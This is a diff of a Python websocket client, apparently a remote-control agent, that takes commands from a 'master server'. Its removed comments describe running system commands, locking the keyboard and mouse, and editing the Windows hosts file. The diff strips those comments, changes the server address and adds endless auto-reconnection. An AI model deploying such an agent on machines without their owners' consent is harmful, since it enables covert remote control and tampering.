@@ -2,13 +2,13 @@ import asyncio
 import websockets
 import json
 import base64
-import subprocess  # Para ejecutar comandos del sistema
-import ctypes      # Para manejar bloqueo/desbloqueo de teclado y ratón en Windows
-import os          # Para manejar modificaciones del archivo hosts (bloqueo de sitios web)
-import time        # Para registrar tiempos en el ping
+import subprocess
+import ctypes
+import os
+import time
 
 # Dirección del servidor maestro
-SERVER_URI = "ws://192.168.30.181:8765"
+SERVER_URI = "ws://172.168.2.87:8765"
 
 # Archivo hosts en sistemas Windows
 HOSTS_FILE = r"C:\Windows\System32\drivers\etc\hosts"
@@ -130,19 +130,23 @@ async def handle_server_commands(websocket):
 
     except websockets.exceptions.ConnectionClosed as e:
         print(f"Conexión cerrada: {e}")
+        print("Intentando reconectar...")
 
 # Función principal del cliente
 async def main():
-    try:
-        print(f"Conectando al servidor maestro en {SERVER_URI}...")
-        async with websockets.connect(SERVER_URI) as websocket:
-            print("Conexión establecida.")
+    while True:  # Intentar reconectar si la conexión se pierde
+        try:
+            print(f"Conectando al servidor maestro en {SERVER_URI}...")
+            async with websockets.connect(SERVER_URI) as websocket:
+                print("Conexión establecida.")
 
-            # Mantener la conexión abierta y escuchar mensajes
-            await handle_server_commands(websocket)
+                # Mantener la conexión abierta y escuchar mensajes
+                await handle_server_commands(websocket)
 
-    except Exception as e:
-        print(f"Error en el cliente: {e}")
+        except Exception as e:
+            print(f"Error en el cliente: {e}")
+            print("Reintentando en 5 segundos...")
+            await asyncio.sleep(5)  # Espera antes de intentar nuevamente
 
 # Ejecutar el cliente
 if __name__ == "__main__":
